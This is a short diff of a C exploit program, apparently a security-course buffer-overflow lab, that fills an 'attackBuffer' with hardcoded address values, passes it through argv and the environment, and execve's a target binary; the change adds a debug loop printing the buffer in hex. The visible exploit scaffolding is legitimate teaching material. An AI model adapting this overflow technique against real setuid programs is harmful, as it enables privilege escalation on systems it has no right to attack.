@@ -29,12 +29,22 @@ main ( int argc, char * argv[] )
 	*(char *) & attackBuffer[265] = 0x1;
 	*(int *) & attackBuffer[200] = 0x3050fd40;
 
+
+
+	for (i = 0; i < BUFSIZE;){
+		printf("%x\n", *(unsigned long *) &attackBuffer[i]);
+		i = i + 4;
+	}
+
+
 	args[0] = TARGET;
 	args[1] = attackBuffer;
 	args[2] = NULL;
 	
 	env[0] = &attackBuffer[270];
 	env[1] = &attackBuffer[192];
+
+
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
